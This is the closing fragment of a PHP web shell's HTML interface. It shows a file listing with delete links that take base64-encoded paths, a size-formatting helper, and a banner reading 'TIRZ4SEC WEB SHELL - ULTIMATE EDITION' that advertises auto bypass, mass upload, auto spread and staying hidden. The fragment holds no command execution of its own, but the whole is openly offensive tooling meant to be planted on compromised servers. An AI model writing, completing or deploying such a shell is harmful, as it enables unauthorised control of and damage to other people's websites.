                    <a href="?del=<?= base64_encode($path) ?>" class="action-mini" style="color:#ff3366;" onclick="return confirm('Yakin?')"><i class="fas fa-trash"></i> Del</a>
                <?php else: ?>
                    <span class="action-mini" style="color:#666;"><i class="fas fa-shield-alt"></i> Protected</span>
                <?php endif; ?>
            </div>
            <?php endif; ?>
        </div>
        <?php endforeach; ?>
    </div>

    <div style="text-align:center;padding:30px;color:#0f8;background:rgba(0,255,0,0.1);margin:20px;border-radius:16px;">
        <strong>TIRZ4SEC WEB SHELL - ULTIMATE EDITION</strong><br>
        AUTO BYPASS • MASS UPLOAD • QUICK DROP • AUTO SPREAD<br>
        <span style="color:#ff6b6b;">STAY HIDDEN, STAY POWERFUL</span>
    </div>
</div>

<?php
function formatSize($bytes) {
    $units = ['B', 'KB', 'MB', 'GB'];
    for ($i = 0; $bytes > 1024 && $i < count($units)-1; $i++) $bytes /= 1024;
    return round($bytes, 2) . ' ' . $units[$i];
}
?>

</body>
</html>
